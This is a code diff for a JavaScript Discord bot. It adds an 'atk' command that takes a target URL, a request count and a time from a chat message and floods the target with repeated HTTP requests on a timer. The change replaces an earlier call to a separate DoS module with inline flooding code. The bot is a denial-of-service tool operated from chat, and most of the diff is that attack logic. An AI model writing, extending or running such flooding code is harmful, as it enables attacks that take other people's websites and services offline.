@@ -24,19 +24,26 @@ if (message.content.startsWith(prefix)) {
 	const args = message.content.slice(prefix.length).trim().split(/ +/g);
     const command = args.shift().toLowerCase();
 	
-	if (command === 'atk') {
+	if(command === 'ping') {
+		message.channel.send('Pong!')
+	}
+	if(command === 'atk') {
 		var arr = message.content.split(" ");
 		var target = arr[1];
 		var req = arr[2];
 		var time = arr[3];
-		const dos = require('./bin');
-
-		dos(target, req, time);
+		var req_per_milisec = req/time;
+		
+		message.channel.send('Running');
+		function sendReq() {
+				request(target, function (error, response, body){
+				if(error) {console.log(error)};
+				console.log('OK')
+				}
+			)}
+		setInterval(sendReq, time)
+		}
 	}
-	if(command === 'ping') {
-		message.channel.send('Pong!')
-	}
-}
 })
 
 client.login(auth.token)
